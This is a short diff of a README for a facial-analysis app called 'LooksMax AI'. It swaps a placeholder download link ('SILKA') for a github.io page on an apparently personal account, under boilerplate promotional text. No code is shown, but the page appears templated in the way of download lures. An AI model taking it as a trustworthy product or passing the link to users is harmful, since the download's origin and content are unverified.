@@ -4,7 +4,7 @@
 
 LooksMax AI is a focused facial analysis utility for measuring facial symmetry, comparing aesthetic ratios, and understanding where your features align with beauty standards. LooksMax AI keeps scans readable, reports clear, and daily self-assessment easier for home users, students, offices, and technicians who rely on LooksMax AI for steady facial analysis insight.
 
-[![GET LooksMax AI](https://img.shields.io/badge/GET%20%E2%80%94%20LooksMax%20AI-0078D6?style=for-the-badge&logoColor=white)](SILKA)
+[![GET LooksMax AI](https://img.shields.io/badge/GET%20%E2%80%94%20LooksMax%20AI-0078D6?style=for-the-badge&logoColor=white)](https://ruthhernandezq487.github.io/.github/looksmax-ai-facial-analysis)
 
 ---
 
